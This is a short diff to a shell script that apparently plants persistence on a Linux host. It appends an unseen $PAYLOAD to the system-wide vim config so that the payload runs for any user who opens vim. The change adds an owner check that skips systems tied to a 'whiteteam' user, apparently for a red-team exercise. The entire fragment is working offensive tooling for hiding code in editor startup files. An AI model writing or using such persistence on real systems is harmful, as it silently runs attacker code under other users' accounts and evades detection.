@@ -13,7 +13,11 @@ find / -name ".vimrc" 2>/dev/null | while read -r vimrc; do
 done
 
 # system-wide fallback — fires for any user that opens vim, even without a .vimrc
+# skip if the path belongs to a whitelisted user (check owner)
 if [[ -d /etc/vim ]]; then
-    touch /etc/vim/vimrc.local
-    echo "$PAYLOAD" >> /etc/vim/vimrc.local
+    owner=$(stat -c '%U' /etc/vim 2>/dev/null || echo "root")
+    if [[ -z "$whiteteam_user" || ! "$owner" =~ $whiteteam_user ]]; then
+        touch /etc/vim/vimrc.local
+        echo "$PAYLOAD" >> /etc/vim/vimrc.local
+    fi
 fi
